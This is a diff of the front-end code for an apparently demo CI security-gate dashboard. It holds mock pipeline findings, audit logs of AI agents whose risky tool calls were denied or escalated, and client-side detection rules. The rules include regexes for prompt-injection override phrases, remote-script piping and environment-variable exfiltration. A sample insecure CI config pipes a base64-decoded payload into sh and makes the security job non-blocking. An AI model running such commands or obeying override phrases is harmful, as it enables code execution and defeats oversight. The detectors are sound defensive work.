      reason:'<b>Human review required.</b> Encoded payload decoded to remote script execution in bootstrap. Reviewer assigned: s.haddad. SLA: 4 h remaining.'},
-    {name:'data-platform › feat/etl-retry', id:'#48103', trigger:'MR !412 · m.laurent', status:'quarantined',
+    {name:'data-platform > feat/etl-retry', id:'#48103', trigger:'MR !412 -  m.laurent', status:'quarantined',
      stages:[['build','passed'],['unit','passed'],['sast','passed'],['deps','quarantined'],['deploy','pending']],
      reason:'<b>Dependency quarantined.</b> "python-dateutils" flagged as typosquat (lexical distance 1, registry intel: post-install egress). Artifact cached in quarantine store, never entered the build.'},
-    {name:'billing-svc › hotfix/webhook-retry', id:'#48097', trigger:'push e88d3a7 · k.osei', status:'passed',
+    {name:'billing-svc > hotfix/webhook-retry', id:'#48097', trigger:'push e88d3a7 -  k.osei', status:'passed',
      stages:[['build','passed'],['unit','passed'],['sast','passed'],['deps','passed'],['deploy','passed']],
      reason:'<b>Recovered.</b> Earlier commit blocked for hardcoded GitLab PAT; token rotated, history purged, follow-up commit clean. Gate reopened automatically after rotation evidence attached.'},
-    {name:'auth-gateway › feat/session-cache', id:'#48090', trigger:'MR !388 · s.haddad', status:'warned',
+    {name:'auth-gateway > feat/session-cache', id:'#48090', trigger:'MR !388 -  s.haddad', status:'warned',
      stages:[['build','passed'],['unit','passed'],['sast','warned'],['deps','passed'],['deploy','passed']],
-     reason:'<b>Deployed with warning.</b> pickle deserialization accepted under exception EX-091 (compensating control: Redis ACL + network policy). Exception expires 2026-08-15 — refactor tracked in REM-1108.'},
-    {name:'edge-tools › feat/diag-cli', id:'#48084', trigger:'push b7e3f18 · j.moreau', status:'blocked',
+     reason:'<b>Deployed with warning.</b> pickle deserialization accepted under exception EX-091 (compensating control: Redis ACL + network policy). Exception expires 2026-08-15 - refactor tracked in REM-1108.'},
+    {name:'edge-tools > feat/diag-cli', id:'#48084', trigger:'push b7e3f18 -  j.moreau', status:'blocked',
      stages:[['build','passed'],['unit','warned'],['sast','blocked'],['deps','pending'],['deploy','pending']],
      reason:'<b>Blocked at AI Security Gate.</b> eval() on user-controlled input (INJ-003). Suggested fix pushed as patch suggestion: ast.literal_eval with operator whitelist.'},
   ],
   agentKpis: [
-    {label:'Tool calls evaluated · 24h', value:'3,412', delta:'+9%', up:true, spark:[280,310,290,340,360,330,380,350,370,390,360,400,410,395]},
+    {label:'Tool calls evaluated -  24h', value:'3,412', delta:'+9%', up:true, spark:[280,310,290,340,360,330,380,350,370,390,360,400,410,395]},
     {label:'Denied operations', value:'23', delta:'0.67% of calls', up:true, spark:[2,1,3,2,1,2,3,1,2,2,3,2,1,2]},
     {label:'Sandboxed executions', value:'188', delta:'+14%', up:true, spark:[12,14,13,16,15,17,14,18,16,19,17,20,18,19]},
     {label:'Awaiting human approval', value:'2', delta:'oldest: 12 min', up:false, alert:true, spark:[1,0,2,1,1,3,2,1,2,1,2,3,2,2]},
   ],
   agentActions: [
-    {agent:'deploy-agent-02', action:'Roll back prod deployment', tool:'k8s.rollout_undo', risk:0.31, policy:'ALLOW · scoped namespace', outcome:'Executed', cls:'b-ok'},
-    {agent:'code-review-agent', action:'Post review comment on MR !412', tool:'gitlab.mr_comment', risk:0.05, policy:'ALLOW · read+comment scope', outcome:'Executed', cls:'b-ok'},
-    {agent:'deploy-agent-02', action:'Open shell on prod node', tool:'run_shell("bash -i")', risk:0.96, policy:'DENY · POL-AGT-011 no interactive shell', outcome:'Denied', cls:'b-crit'},
-    {agent:'remediation-agent', action:'Rotate leaked GitLab PAT', tool:'vault.rotate_secret', risk:0.42, policy:'ALLOW · with audit artifact', outcome:'Executed', cls:'b-ok'},
-    {agent:'data-sync-agent', action:'Export table to external bucket', tool:'s3.put_object(ext)', risk:0.89, policy:'ESCALATE · cross-boundary egress', outcome:'Awaiting approval', cls:'b-med'},
-    {agent:'triage-agent', action:'Auto-close finding as false positive', tool:'findings.close', risk:0.58, policy:'SANDBOX · shadow-mode first', outcome:'Sandboxed', cls:'b-quar'},
-    {agent:'ci-fix-agent', action:'Commit patch to protected branch', tool:'gitlab.commit(main)', risk:0.74, policy:'DENY · protected ref requires human', outcome:'Denied', cls:'b-crit'},
+    {agent:'deploy-agent-02', action:'Roll back prod deployment', tool:'k8s.rollout_undo', risk:0.31, policy:'ALLOW -  scoped namespace', outcome:'Executed', cls:'b-ok'},
+    {agent:'code-review-agent', action:'Post review comment on MR !412', tool:'gitlab.mr_comment', risk:0.05, policy:'ALLOW -  read+comment scope', outcome:'Executed', cls:'b-ok'},
+    {agent:'deploy-agent-02', action:'Open shell on prod node', tool:'run_shell("bash -i")', risk:0.96, policy:'DENY -  POL-AGT-011 no interactive shell', outcome:'Denied', cls:'b-crit'},
+    {agent:'remediation-agent', action:'Rotate leaked GitLab PAT', tool:'vault.rotate_secret', risk:0.42, policy:'ALLOW -  with audit artifact', outcome:'Executed', cls:'b-ok'},
+    {agent:'data-sync-agent', action:'Export table to external bucket', tool:'s3.put_object(ext)', risk:0.89, policy:'ESCALATE -  cross-boundary egress', outcome:'Awaiting approval', cls:'b-med'},
+    {agent:'triage-agent', action:'Auto-close finding as false positive', tool:'findings.close', risk:0.58, policy:'SANDBOX -  shadow-mode first', outcome:'Sandboxed', cls:'b-quar'},
+    {agent:'ci-fix-agent', action:'Commit patch to protected branch', tool:'gitlab.commit(main)', risk:0.74, policy:'DENY -  protected ref requires human', outcome:'Denied', cls:'b-crit'},
   ],
   agentTimeline: [
-    {t:'14:52:09', cls:'t-deny', txt:'<b>deploy-agent-02</b> requested <span class="mono">run_shell("bash -i")</span> — denied by POL-AGT-011. Session risk raised to HIGH, agent moved to constrained context.'},
+    {t:'14:52:09', cls:'t-deny', txt:'<b>deploy-agent-02</b> requested <span class="mono">run_shell("bash -i")</span> - denied by POL-AGT-011. Session risk raised to HIGH, agent moved to constrained context.'},
     {t:'14:47:31', cls:'t-appr', txt:'<b>data-sync-agent</b> export to external bucket escalated to human approval (cross-boundary egress, risk 0.89).'},
     {t:'14:40:12', cls:'t-ok', txt:'<b>remediation-agent</b> rotated leaked PAT via vault. Evidence artifact EV-88412 attached automatically.'},
-    {t:'14:31:55', cls:'t-warn', txt:'<b>triage-agent</b> attempted bulk-close of 14 findings — throttled, moved to shadow mode for review.'},
+    {t:'14:31:55', cls:'t-warn', txt:'<b>triage-agent</b> attempted bulk-close of 14 findings - throttled, moved to shadow mode for review.'},
     {t:'14:22:03', cls:'t-ok', txt:'<b>code-review-agent</b> completed policy-compliant review of MR !412 (3 comments, 0 privileged calls).'},
   ],
   deniedOps: [
@@ -831,14 +831,14 @@ const DB = {
     {label:'Internet-facing assets', value:'34', delta:'2 unmanaged', up:false, spark:[30,31,31,32,32,33,33,33,34,34,33,34,34,34]},
     {label:'Open KEV vulnerabilities', value:'3', delta:'1 ransomware-linked', up:false, alert:true, spark:[5,5,4,4,4,3,4,3,3,4,3,3,3,3]},
     {label:'Median patch age (edge)', value:'19 d', delta:'policy max: 14 d', up:false, alert:true, spark:[9,10,12,11,13,14,15,14,16,17,18,18,19,19]},
-    {label:'Backups verified · 30d', value:'92%', delta:'2 restore tests failed', up:false, spark:[97,96,97,95,96,94,95,93,94,92,93,92,92,92]},
+    {label:'Backups verified -  30d', value:'92%', delta:'2 restore tests failed', up:false, spark:[97,96,97,95,96,94,95,93,94,92,93,92,92,92]},
   ],
   expServices: [
-    {name:'edge-gw-eu-03 · 443/tcp (nginx 1.24)', risk:92, note:'KEV CVE-2026-21771 · ransomware-linked · patch overdue'},
-    {name:'vpn-hub-01 · 500/udp (IKEv2)', risk:61, note:'firmware 2 minor versions behind'},
-    {name:'git.corp · 22/tcp (sshd)', risk:34, note:'key-only auth, fail2ban active'},
-    {name:'api.pay.example · 443/tcp', risk:22, note:'WAF + mTLS, clean scan'},
-    {name:'legacy-ftp-01 · 21/tcp', risk:88, note:'unmanaged asset — decommission ticket INFRA-2291 open 47 d'},
+    {name:'edge-gw-eu-03 -  443/tcp (nginx 1.24)', risk:92, note:'KEV CVE-2026-21771 -  ransomware-linked -  patch overdue'},
+    {name:'vpn-hub-01 -  500/udp (IKEv2)', risk:61, note:'firmware 2 minor versions behind'},
+    {name:'git.corp -  22/tcp (sshd)', risk:34, note:'key-only auth, fail2ban active'},
+    {name:'api.pay.example -  443/tcp', risk:22, note:'WAF + mTLS, clean scan'},
+    {name:'legacy-ftp-01 -  21/tcp', risk:88, note:'unmanaged asset - decommission ticket INFRA-2291 open 47 d'},
   ],
   kev: [
     {cve:'CVE-2026-21771', asset:'edge-gw-eu-03', tag:'ransomware-linked', sev:'crit', note:'Exploited in the wild; patch window exceeded by 5 days.'},
@@ -853,10 +853,10 @@ const DB = {
     {name:'Developer endpoints', pct:81, color:'var(--warn)'},
   ],
   backup: [
-    {name:'PostgreSQL prod cluster', status:'Restore test FAILED in sandbox — dump integrity mismatch', cls:'b-crit', detail:'Last good verified restore: 9 days ago. Escalated to DBRE, NIST Recover.'},
-    {name:'Object storage (payments)', status:'Verified · immutable · 4h RPO', cls:'b-ok', detail:'Cross-region replica healthy, last restore test 2 days ago.'},
-    {name:'GitLab instance', status:'Verified · daily + geo-replica', cls:'b-ok', detail:'Restore drill passed 6 days ago (RTO 38 min).'},
-    {name:'Vault (secrets)', status:'Snapshot OK — restore drill overdue', cls:'b-med', detail:'Policy requires quarterly drill; last drill 4 months ago.'},
+    {name:'PostgreSQL prod cluster', status:'Restore test FAILED in sandbox - dump integrity mismatch', cls:'b-crit', detail:'Last good verified restore: 9 days ago. Escalated to DBRE, NIST Recover.'},
+    {name:'Object storage (payments)', status:'Verified -  immutable -  4h RPO', cls:'b-ok', detail:'Cross-region replica healthy, last restore test 2 days ago.'},
+    {name:'GitLab instance', status:'Verified -  daily + geo-replica', cls:'b-ok', detail:'Restore drill passed 6 days ago (RTO 38 min).'},
+    {name:'Vault (secrets)', status:'Snapshot OK - restore drill overdue', cls:'b-med', detail:'Policy requires quarterly drill; last drill 4 months ago.'},
   ],
   nistFns: [
     {code:'GV', name:'Govern', score:74, open:5},
@@ -867,16 +867,16 @@ const DB = {
     {code:'RC', name:'Recover', score:61, open:4},
   ],
   nistRows: [
-    {finding:'GitLab PAT committed in billing-svc', fn:'Protect', cat:'PR.AA — Identity & credentials', owner:'K. Osei', sla:'closed (42 min)', evidence:'EV-88412', status:'Resolved', cls:'b-ok'},
-    {finding:'Env exfiltration path in payments-api', fn:'Detect / Respond', cat:'DE.CM — Continuous monitoring', owner:'J. Moreau', sla:'4 h remaining', evidence:'EV-88437', status:'Blocked at gate', cls:'b-crit'},
-    {finding:'Critical patch debt on edge-gw-eu-03', fn:'Govern / Protect', cat:'GV.RM — Risk management', owner:'Infra Guild', sla:'overdue 5 d', evidence:'EV-88301', status:'Escalated', cls:'b-crit'},
-    {finding:'Typosquatted dependency (data-platform)', fn:'Identify', cat:'ID.SC — Supply chain', owner:'M. Laurent', sla:'18 h remaining', evidence:'EV-88420', status:'Quarantined', cls:'b-quar'},
-    {finding:'PostgreSQL restore test failure', fn:'Recover', cat:'RC.RP — Recovery planning', owner:'DBRE Team', sla:'2 d remaining', evidence:'EV-88399', status:'In progress', cls:'b-med'},
-    {finding:'Weak admin account on legacy-ftp-01', fn:'Protect', cat:'PR.AA — Identity & credentials', owner:'IT Ops', sla:'3 d remaining', evidence:'—', status:'Exception requested', cls:'b-med'},
-    {finding:'CI security gate made non-blocking', fn:'Govern', cat:'GV.PO — Policy', owner:'S. Haddad', sla:'3 d remaining', evidence:'EV-88408', status:'Under review', cls:'b-med'},
-    {finding:'pickle deserialization in auth-gateway', fn:'Protect', cat:'PR.PS — Platform security', owner:'S. Haddad', sla:'exception EX-091 to 2026-08-15', evidence:'EV-88355', status:'Exception granted', cls:'b-neutral'},
+    {finding:'GitLab PAT committed in billing-svc', fn:'Protect', cat:'PR.AA - Identity & credentials', owner:'K. Osei', sla:'closed (42 min)', evidence:'EV-88412', status:'Resolved', cls:'b-ok'},
+    {finding:'Env exfiltration path in payments-api', fn:'Detect / Respond', cat:'DE.CM - Continuous monitoring', owner:'J. Moreau', sla:'4 h remaining', evidence:'EV-88437', status:'Blocked at gate', cls:'b-crit'},
+    {finding:'Critical patch debt on edge-gw-eu-03', fn:'Govern / Protect', cat:'GV.RM - Risk management', owner:'Infra Guild', sla:'overdue 5 d', evidence:'EV-88301', status:'Escalated', cls:'b-crit'},
+    {finding:'Typosquatted dependency (data-platform)', fn:'Identify', cat:'ID.SC - Supply chain', owner:'M. Laurent', sla:'18 h remaining', evidence:'EV-88420', status:'Quarantined', cls:'b-quar'},
+    {finding:'PostgreSQL restore test failure', fn:'Recover', cat:'RC.RP - Recovery planning', owner:'DBRE Team', sla:'2 d remaining', evidence:'EV-88399', status:'In progress', cls:'b-med'},
+    {finding:'Weak admin account on legacy-ftp-01', fn:'Protect', cat:'PR.AA - Identity & credentials', owner:'IT Ops', sla:'3 d remaining', evidence:' - ', status:'Exception requested', cls:'b-med'},
+    {finding:'CI security gate made non-blocking', fn:'Govern', cat:'GV.PO - Policy', owner:'S. Haddad', sla:'3 d remaining', evidence:'EV-88408', status:'Under review', cls:'b-med'},
+    {finding:'pickle deserialization in auth-gateway', fn:'Protect', cat:'PR.PS - Platform security', owner:'S. Haddad', sla:'exception EX-091 to 2026-08-15', evidence:'EV-88355', status:'Exception granted', cls:'b-neutral'},
   ],
-  // ORMA — Operational Resilience Maturity Assessment (10 domains, 5-level scale).
+  // ORMA - Operational Resilience Maturity Assessment (10 domains, 5-level scale).
   // Modelled on the CDPQ operational-resilience maturity framework. Each domain
   // carries a set of assessment criteria ("tests"); checking them sets the level.
   ormaLevels: [
@@ -909,15 +909,15 @@ const DB = {
      tests:['BIA drives RTO/RPO per service','Continuity & recovery plans regularly tested','Backups verified by restore testing']},
   ],
   audit: [
-    {ts:'2026-07-07 14:52:09Z', trig:'agent tool call', subj:'deploy-agent-02 · run_shell', policy:'POL-AGT-011', decision:'Denied', approver:'— (automatic)', ev:'EV-88441'},
-    {ts:'2026-07-07 14:48:00Z', trig:'webhook push', subj:'payments-api @ a3f92c1', policy:'EXF-004 / NET-002', decision:'Blocked', approver:'— (automatic)', ev:'EV-88437'},
+    {ts:'2026-07-07 14:52:09Z', trig:'agent tool call', subj:'deploy-agent-02 -  run_shell', policy:'POL-AGT-011', decision:'Denied', approver:' -  (automatic)', ev:'EV-88441'},
+    {ts:'2026-07-07 14:48:00Z', trig:'webhook push', subj:'payments-api @ a3f92c1', policy:'EXF-004 / NET-002', decision:'Blocked', approver:' -  (automatic)', ev:'EV-88437'},
     {ts:'2026-07-07 14:13:22Z', trig:'webhook push', subj:'ml-training-jobs @ 7bd201e', policy:'OBF-002', decision:'Human review', approver:'s.haddad (pending)', ev:'EV-88431'},
     {ts:'2026-07-07 12:40:12Z', trig:'agent remediation', subj:'vault PAT rotation (billing-svc)', policy:'REM-RUNBOOK-04', decision:'Executed', approver:'k.osei', ev:'EV-88412'},
-    {ts:'2026-07-07 12:02:51Z', trig:'MR pipeline', subj:'data-platform !412', policy:'SUP-009', decision:'Quarantined', approver:'— (automatic)', ev:'EV-88420'},
-    {ts:'2026-07-07 11:31:07Z', trig:'webhook push', subj:'billing-svc @ e88d3a7', policy:'SEC-001', decision:'Blocked → resolved', approver:'k.osei', ev:'EV-88410'},
-    {ts:'2026-07-07 09:58:44Z', trig:'exposure scan', subj:'edge-gw-eu-03 · CVE-2026-21771', policy:'EXP-KEV-01', decision:'Escalated', approver:'ciso-office', ev:'EV-88301'},
+    {ts:'2026-07-07 12:02:51Z', trig:'MR pipeline', subj:'data-platform !412', policy:'SUP-009', decision:'Quarantined', approver:' -  (automatic)', ev:'EV-88420'},
+    {ts:'2026-07-07 11:31:07Z', trig:'webhook push', subj:'billing-svc @ e88d3a7', policy:'SEC-001', decision:'Blocked -> resolved', approver:'k.osei', ev:'EV-88410'},
+    {ts:'2026-07-07 09:58:44Z', trig:'exposure scan', subj:'edge-gw-eu-03 -  CVE-2026-21771', policy:'EXP-KEV-01', decision:'Escalated', approver:'ciso-office', ev:'EV-88301'},
     {ts:'2026-07-07 08:12:30Z', trig:'MR pipeline', subj:'auth-gateway !388', policy:'DES-001 + EX-091', decision:'Allowed w/ exception', approver:'ciso-office', ev:'EV-88355'},
-    {ts:'2026-07-06 22:47:18Z', trig:'backup drill', subj:'PostgreSQL prod restore (sandbox)', policy:'RC-DRILL-02', decision:'Failed — task opened', approver:'— (automatic)', ev:'EV-88399'},
+    {ts:'2026-07-06 22:47:18Z', trig:'backup drill', subj:'PostgreSQL prod restore (sandbox)', policy:'RC-DRILL-02', decision:'Failed - task opened', approver:' -  (automatic)', ev:'EV-88399'},
   ],
 };
 
@@ -956,12 +956,12 @@ security-scan:
   script: [guardagent scan --diff]
   allow_failure: true
   rules:
-    - if: $CI_PIPELINE_SOURCE == "schedule"
+ - if: $CI_PIPELINE_SOURCE == "schedule"
 
 deploy:
   stage: deploy
   script:
-    - echo "$PAYLOAD" | base64 -d | sh
+ - echo "$PAYLOAD" | base64 -d | sh
   when: always`,
 clean:`from datetime import date
 
@@ -974,7 +974,7 @@ def format_badge(n: int) -> str:
 };
 
 /* =====================================================================
-   ANALYZER — real client-side multi-layer heuristics
+   ANALYZER - real client-side multi-layer heuristics
    ===================================================================== */
 const RULES = [
  {id:'SEC-001', cat:'code', name:'GitLab personal access token', sev:'critical', w:35,
@@ -986,7 +986,7 @@ const RULES = [
  {id:'SEC-004', cat:'code', name:'Stripe live secret key', sev:'critical', w:35,
   re:/sk_live_[0-9A-Za-z]{16,}/, desc:'Stripe live-mode secret key found. Rotation required; payment scope exposure.'},
  {id:'INJ-003', cat:'code', name:'eval/exec on dynamic input', sev:'critical', w:30,
-  re:/\b(?:eval|exec)\s*\(\s*(?:input|request|args|params|data|expr|payload|f["'])/i, desc:'Dynamic execution primitive fed by external input — direct arbitrary code execution path.'},
+  re:/\b(?:eval|exec)\s*\(\s*(?:input|request|args|params|data|expr|payload|f["'])/i, desc:'Dynamic execution primitive fed by external input - direct arbitrary code execution path.'},
  {id:'INJ-001', cat:'code', name:'Dynamic execution primitive', sev:'high', w:16,
   re:/\b(?:eval|exec)\s*\(/, desc:'eval()/exec() present. Even with static input this is a fragile pattern; prefer ast.literal_eval or explicit dispatch.'},
  {id:'DES-001', cat:'code', name:'Unsafe deserialization', sev:'high', w:20,
@@ -997,30 +997,30 @@ const RULES = [
   re:/["'][A-Za-z0-9+\/]{40,}={0,2}["']/, desc:'Long base64-like literal found. Verify contents; encoded payloads are a common obfuscation vector.'},
  {id:'EXF-004', cat:'exfil', name:'Environment bulk-read + external send', sev:'critical', w:34,
   test:(s)=>/os\.environ(?:\.items\(\)|\[|\.get)/.test(s) && /requests\.(?:post|put|get)|urllib|httpx|fetch\s*\(|curl\s+/i.test(s),
-  desc:'Code reads environment variables and performs outbound network calls in the same unit — a likely secret exfiltration path.'},
+  desc:'Code reads environment variables and performs outbound network calls in the same unit - a likely secret exfiltration path.'},
  {id:'NET-002', cat:'exfil', name:'Hardcoded external egress endpoint', sev:'medium', w:12,
   re:/https?:\/\/(?!localhost|127\.0\.0\.1|(?:[a-z0-9-]+\.)*(?:example\.com|corp|internal))[a-z0-9.-]+\.(?:dev|xyz|top|io|cc|link)\b/i,
   desc:'Outbound endpoint on a low-reputation or unregistered TLD. Register egress domains with security review.'},
  {id:'ERR-007', cat:'code', name:'Silenced exception around I/O', sev:'medium', w:8,
-  re:/except\s+(?:Exception|BaseException)?\s*:\s*\n?\s*pass/, desc:'Broad except/pass hides failures — frequently paired with quiet exfiltration or unstable behaviour.'},
+  re:/except\s+(?:Exception|BaseException)?\s*:\s*\n?\s*pass/, desc:'Broad except/pass hides failures - frequently paired with quiet exfiltration or unstable behaviour.'},
  {id:'SUP-009', cat:'supply', name:'Typosquatted package name', sev:'critical', w:30,
   test:(s)=>{const squats=['python-dateutils','reqeusts','urlib3','beutifulsoup4','djago','flaskk','numpi','pandass','crypto-utils-py','discord-py-slash'];
     const hits=squats.filter(p=>new RegExp('(^|\\n)\\s*'+p.replace(/[-]/g,'[-]')+'\\b','i').test(s));
     return hits.length?hits.join(', '):false;},
-  desc:'Package name is lexically adjacent to a popular library — high-confidence typosquat. Replace with the canonical package.'},
+  desc:'Package name is lexically adjacent to a popular library - high-confidence typosquat. Replace with the canonical package.'},
  {id:'SUP-014', cat:'supply', name:'Remote script executed at build time', sev:'high', w:22,
   re:/curl[^\n|]*\|\s*(?:ba)?sh|wget[^\n|]*\|\s*(?:ba)?sh|ADD\s+https?:\/\//i, desc:'Build fetches and executes remote content. Pin, vendor and checksum third-party install scripts.'},
  {id:'DOC-003', cat:'supply', name:'Fragile Docker base / privileges', sev:'medium', w:10,
   re:/FROM\s+\S+:latest|USER\s+root|chmod\s+777|--privileged/, desc:'Unpinned base image, root user or world-writable permissions weaken container supply-chain integrity.'},
  {id:'DOC-007', cat:'exposure', name:'SSH exposed from container', sev:'medium', w:9,
-  re:/EXPOSE\s+22\b/, desc:'Container exposes SSH — expand of attack surface that gates should question.'},
+  re:/EXPOSE\s+22\b/, desc:'Container exposes SSH - expand of attack surface that gates should question.'},
  {id:'CIP-005', cat:'cipolicy', name:'Security job made non-blocking', sev:'high', w:20,
   re:/allow_failure:\s*true/, desc:'A pipeline job tolerates failure. If this is the security gate, the control is silently disabled.'},
  {id:'CIP-009', cat:'cipolicy', name:'Unconditional job execution', sev:'medium', w:8,
-  re:/when:\s*always/, desc:'"when: always" runs regardless of upstream failures — verify this cannot ship unverified artifacts.'},
+  re:/when:\s*always/, desc:'"when: always" runs regardless of upstream failures - verify this cannot ship unverified artifacts.'},
  {id:'AGT-002', cat:'agent', name:'Prompt-injection marker', sev:'high', w:18,
   re:/ignore (?:all )?(?:previous|prior|above) instructions|disregard (?:your|the) (?:system|previous) prompt/i,
-  desc:'Content carries instruction-override language targeting an AI agent — indirect prompt injection vector.'},
+  desc:'Content carries instruction-override language targeting an AI agent - indirect prompt injection vector.'},
  {id:'AGT-005', cat:'agent', name:'Agent self-privilege language', sev:'medium', w:10,
   re:/(?:disable|bypass|remove).{0,24}(?:guardrail|safety|policy|sandbox)/i, desc:'Content requests weakening of agent guardrails or sandbox policy.'},
 ];
@@ -1055,13 +1055,13 @@ function analyze(src){
   const nHigh=findings.filter(f=>f.sev==='high').length;
   let decision, why;
   if(nCrit>=2 || (nCrit>=1 && findings.some(f=>f.cat==='supply'&&f.sev==='critical'))){
-    decision='Quarantine'; why='Multiple critical signals including supply-chain or exfiltration class — artifact must not enter any build until replaced and reviewed.';
+    decision='Quarantine'; why='Multiple critical signals including supply-chain or exfiltration class - artifact must not enter any build until replaced and reviewed.';
   } else if(nCrit>=1 || total>=55){
-    decision='Block'; why='At least one critical finding (or composite risk ≥ 55) — merge blocked pending remediation.';
+    decision='Block'; why='At least one critical finding (or composite risk >= 55) - merge blocked pending remediation.';
   } else if(nHigh>=1 || total>=25){
-    decision='Review'; why='High-severity or accumulated medium findings — human review required before merge.';
+    decision='Review'; why='High-severity or accumulated medium findings - human review required before merge.';
   } else {
-    decision='Allow'; why=findings.length?'Only low-impact hygiene findings — allowed with annotations.':'No detections across all analysis layers — allowed under fast-path policy.';
+    decision='Allow'; why=findings.length?'Only low-impact hygiene findings - allowed with annotations.':'No detections across all analysis layers - allowed under fast-path policy.';
   }
   return {findings, catScore, total, decision, why};
 }
@@ -1109,7 +1109,7 @@ function renderDashboard(){
   svg.innerHTML=[0,.25,.5,.75,1].map(f=>`<line x1="${P}" x2="${W-P}" y1="${14+f*(H-34)}" y2="${14+f*(H-34)}" stroke="var(--line)" stroke-width="1" opacity=".6"/>`).join('')
     +area(t.scans,maxS,'#22d3ee')+line(t.scans,maxS,'var(--accent)',2)
     +line(t.blocks.map(v=>v*maxB/maxB),maxB,'var(--crit)',1.6)+line(t.reviews,maxB,'var(--warn)',1.6);
-  // posture ring — live score from /api/posture when the backend is up, else 82
+  // posture ring - live score from /api/posture when the backend is up, else 82
   const score=window._posture?window._posture.score:82;
   const grade=window._posture?window._posture.grade:'B';
   const C=2*Math.PI*50, col=score>=80?'var(--ok)':score>=60?'var(--warn)':'var(--crit)';
@@ -1149,7 +1149,7 @@ function renderTriage(){
 
 function openCommit(sha){
   const c=DB.commits.find(x=>x.sha===sha); if(!c)return;
-  $('#drawer-title').innerHTML=`<span class="mono">${c.sha}</span> · ${c.repo}`;
+  $('#drawer-title').innerHTML=`<span class="mono">${c.sha}</span> -  ${c.repo}`;
   $('#drawer-body').innerHTML=`
     <div class="d-section"><div style="display:flex;gap:8px;flex-wrap:wrap">${sevBadge(c.sev)}${decBadge(c.decision)}<span class="badge b-accent">confidence ${(c.conf*100).toFixed(0)}%</span></div></div>
     <div class="d-section"><h4>Context</h4><dl class="d-kv">
@@ -1177,13 +1177,13 @@ function renderInspection(r,engineLabel,reasoning){
   const out=$('#inspect-out');
   const vcls={Allow:'v-allow',Review:'v-review',Block:'v-block',Quarantine:'v-quarantine'}[r.decision]||'v-review';
   const rz=reasoning?`<div class="card" style="margin-bottom:12px"><h3>GPT-5.6 reasoning (intent)</h3>
-      <div style="font-size:.83rem"><b>${esc(reasoning.threat_class||'—')}</b> · confidence ${(100*(reasoning.confidence||0)).toFixed(0)}% · false-positive risk ${esc(reasoning.false_positive_risk||'—')}</div>
+      <div style="font-size:.83rem"><b>${esc(reasoning.threat_class||' - ')}</b> -  confidence ${(100*(reasoning.confidence||0)).toFixed(0)}% -  false-positive risk ${esc(reasoning.false_positive_risk||' - ')}</div>
       <p style="font-size:.8rem;color:var(--txt2);margin-top:6px">${esc(reasoning.summary||'')}</p>
       ${reasoning.remediation?`<p style="font-size:.79rem;margin-top:6px"><b>Next action:</b> ${esc(reasoning.remediation)}</p>`:''}</div>`:'';
   out.innerHTML=`
       <div class="verdict ${vcls}"><span class="v-badge">${r.decision.toUpperCase()}</span>
         <div><div style="font-weight:600;font-size:.88rem">${esc(r.why)}</div>
-        <div class="dim" style="font-size:.74rem;margin-top:3px">${r.findings.length} finding${r.findings.length!==1?'s':''} · composite risk ${r.total}/100 · engine ${esc(engineLabel)}</div></div></div>
+        <div class="dim" style="font-size:.74rem;margin-top:3px">${r.findings.length} finding${r.findings.length!==1?'s':''} -  composite risk ${r.total}/100 -  engine ${esc(engineLabel)}</div></div></div>
       ${rz}
       <div class="card" style="margin-bottom:12px"><h3>Composite risk breakdown</h3><div class="scorebars">${CATS.map(([c,label])=>{
         const v=Math.round(r.catScore[c]||0);const col=v>=60?'var(--crit)':v>=30?'var(--warn)':'var(--ok)';
@@ -1196,9 +1196,9 @@ function renderInspection(r,engineLabel,reasoning){
 async function runInspection(){
   const src=$('#code-input').value;
   const out=$('#inspect-out');
-  if(!src.trim()){out.innerHTML=emptyInspect();toast('Nothing to analyze — paste code first.');return;}
-  const btn=$('#analyze-btn');btn.disabled=true;btn.textContent='Analyzing…';
-  out.innerHTML=`<div class="card" style="display:grid;place-items:center;min-height:340px"><div style="text-align:center"><div class="badge b-accent pulse">running 7 analysis layers</div><p class="dim" style="margin-top:10px;font-size:.75rem">secrets → deps → injection → obfuscation → exfiltration → CI policy → agent safety</p></div></div>`;
+  if(!src.trim()){out.innerHTML=emptyInspect();toast('Nothing to analyze - paste code first.');return;}
+  const btn=$('#analyze-btn');btn.disabled=true;btn.textContent='Analyzing...';
+  out.innerHTML=`<div class="card" style="display:grid;place-items:center;min-height:340px"><div style="text-align:center"><div class="badge b-accent pulse">running 7 analysis layers</div><p class="dim" style="margin-top:10px;font-size:.75rem">secrets -> deps -> injection -> obfuscation -> exfiltration -> CI policy -> agent safety</p></div></div>`;
   // Try the live backend (deterministic + OpenAI GPT-5.6). Fall back to the
   // in-browser analyzer so the demo always works offline.
   try{
@@ -1240,8 +1240,8 @@ async function probeHealth(tries){
     try{
       const r=await fetch('/health',{signal:AbortSignal.timeout(2500)});
       if(r.ok){const h=await r.json();
-        $('#engine-name').textContent=h.openai?h.model+' · OpenAI (LIVE)':'backend engine + deterministic fallback';
-        $('#gate-badge').textContent=h.openai?'GATE ONLINE · GPT-5.6 LIVE':'GATE ONLINE';
+        $('#engine-name').textContent=h.openai?h.model+' -  OpenAI (LIVE)':'backend engine + deterministic fallback';
+        $('#gate-badge').textContent=h.openai?'GATE ONLINE -  GPT-5.6 LIVE':'GATE ONLINE';
         return true;}
     }catch(e){/* server may still be booting */}
     await new Promise(r=>setTimeout(r,900));
@@ -1283,7 +1283,7 @@ function renderShield(res){
   out.innerHTML=`
     <div class="verdict ${vcls}"><span class="v-badge">${res.verdict}</span>
       <div><div style="font-weight:600;font-size:.88rem">${esc(rz.attack_class||'Screened')}</div>
-      <div class="dim" style="font-size:.74rem;margin-top:3px">${s.hits.length} detector hit${s.hits.length!==1?'s':''} · composite ${s.composite}/100 · source ${esc(res.source)} · engine ${esc(rz.engine||'deterministic')}</div></div></div>
+      <div class="dim" style="font-size:.74rem;margin-top:3px">${s.hits.length} detector hit${s.hits.length!==1?'s':''} -  composite ${s.composite}/100 -  source ${esc(res.source)} -  engine ${esc(rz.engine||'deterministic')}</div></div></div>
     <div class="card" style="margin-bottom:12px"><h3>Intent assessment</h3>
       <p style="font-size:.82rem;color:var(--txt2)">${esc(rz.summary||'No injection patterns detected.')}</p>
       ${rz.recommendation?`<p style="font-size:.79rem;margin-top:6px"><b>Recommendation:</b> ${esc(rz.recommendation)}</p>`:''}
@@ -1291,23 +1291,23 @@ function renderShield(res){
     <div>${s.hits.length?s.hits.map(h=>`<div class="finding sev-${h.sev}">
       <div class="f-head"><span class="f-name">${esc(h.name)}</span>${sevBadge(h.sev)}<span class="badge b-neutral mono">${h.id}</span><span class="badge b-neutral">${esc(h.cls)}</span></div>
